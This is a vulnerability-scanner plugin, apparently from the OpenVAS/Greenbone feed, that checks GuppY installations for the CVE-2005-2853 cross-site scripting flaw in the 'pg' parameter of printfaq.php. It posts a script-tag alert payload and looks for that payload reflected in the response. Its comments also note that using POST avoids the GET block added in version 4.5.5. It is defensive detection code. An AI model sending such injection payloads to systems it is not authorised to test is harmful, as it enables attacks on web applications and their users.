# SPDX-FileCopyrightText: 2006 Josh Zlatin-Amishav
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19942");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-2853");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("GuppY pg Parameter Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2006 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "cross_site_scripting.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2005-09/0362.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/14752");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/14984");

  script_tag(name:"solution", value:"Upgrade to version 4.5.6a or later.");

  script_tag(name:"summary", value:"The version of Guppy / EasyGuppY installed on the remote host fails to
  sanitize user-supplied input to the 'pg' field in the 'printfaq.php' script.");

  script_tag(name:"impact", value:"An attacker can exploit this flaw to launch cross-site scripting and
  possibly directory traversal attacks against the affected application.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("url_func.inc");
include("misc_func.inc");

vtstrings = get_vt_strings();

xss = "<script>alert('" + vtstrings["lowercase_rand"] + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode( str:xss );

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) ) exit( 0 );

host = http_host_name( dont_add_port:TRUE );
if( http_get_has_generic_xss( port:port, host:host ) ) exit( 0 );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/printfaq.php?lng=en&pg=1";

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( res =~ "^HTTP/1\.[01] 200" && "<title>GuppY - " >< res ) {
    # nb: we'll use a POST since 4.5.5 prevents GETs from working but still allows us to pass data via POSTs and cookies.
    # Also, we check for the XSS rather than try to read an arbitrary file since the latter doesn't work with 4.5.5 except under Windows.
    postdata = string( 'pg=', exss );
    url = dir + "/printfaq.php";
    req = http_post( item:url, port:port, data:postdata );
    res = http_keepalive_send_recv( port:port, data:req );

    if( res =~ "^HTTP/1\.[01] 200" && xss >< res ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 0 );
